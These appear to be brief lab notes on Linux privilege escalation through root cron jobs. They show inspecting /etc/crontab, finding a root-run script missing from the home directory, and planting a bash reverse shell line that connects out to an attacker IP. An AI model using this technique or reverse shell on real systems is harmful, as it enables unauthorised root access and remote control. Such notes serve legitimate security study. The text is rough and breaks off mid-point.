Identification 

`cat /etc/crontab`
in here cronjobs tab 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md


![](/Linux-Privilege-Notes/images/cronjobs.png)

here we can see 2 process are running as root 

1)  * * * * root overwrite.sh
2) * * * * * root /usr/local/bin/compress.sh

**PART 1**
 as  we can see they are running every minute , every second 

we can see the path of crontab that is /home/user 

if we see there is no overwrite.sh on home user so  we put a reverse shell there and wait for the execution 

"bash -i >& /dev/tcp/IP/1234 0>&1"



similarly we put a reverse shell





